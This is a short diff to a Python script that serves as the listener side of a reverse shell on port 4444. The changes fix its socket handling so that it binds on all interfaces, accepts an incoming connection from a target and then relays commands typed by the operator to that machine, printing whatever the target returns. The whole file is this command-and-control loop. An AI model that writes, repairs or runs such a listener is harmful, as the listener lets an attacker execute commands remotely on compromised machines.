@@ -2,7 +2,7 @@
 
 import socket
 
-ip = '192.168.10.8'
+ip = '192.168.10.10'
 port = 4444
 
 """
@@ -16,13 +16,14 @@ listener.listen() will return to object :: connection and address(target_ip)
 
 listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
-listener.bind((ip,port))
+listener.bind(("0.0.0.0", 4444))
+listener.listen(0)
 print("[-] Waiting for incomming connection.")
-connection,address = listener.listen(0) 
+connection,address = listener.accept()
 print(f"[+] Connected successfully to {address}")
 
 while True:
     command = input(">> ")
     connection.send(command)
-    result = connection.revc(1024)
+    result = connection.recv(1024)
     print(result)
